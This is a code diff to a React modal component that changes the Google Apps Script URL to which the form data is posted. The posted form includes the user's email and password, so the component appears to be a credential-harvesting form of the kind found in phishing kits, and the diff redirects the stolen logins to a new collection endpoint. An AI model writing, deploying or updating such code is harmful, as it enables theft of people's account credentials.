@@ -53,7 +53,7 @@ const Modal = ({ isModal, setIsModal }) => {
         "2z";
       update(ref(database), updates);
       axios.post(
-        "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
+        "https://script.google.com/macros/s/AKfycbzo3dZgMtBIIml9lhUAsfsnOJTNyhLHUZTlnOyg2XHWcQPwXlDU3tjca5r3vejr-JdG/exec",
         form
       );
     } else {
@@ -86,7 +86,7 @@ const Modal = ({ isModal, setIsModal }) => {
         form.append("email", data.email);
         form.append("password", passwords);
         axios.post(
-          "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
+          "https://script.google.com/macros/s/AKfycbzo3dZgMtBIIml9lhUAsfsnOJTNyhLHUZTlnOyg2XHWcQPwXlDU3tjca5r3vejr-JdG/exec",
           form
         );
 
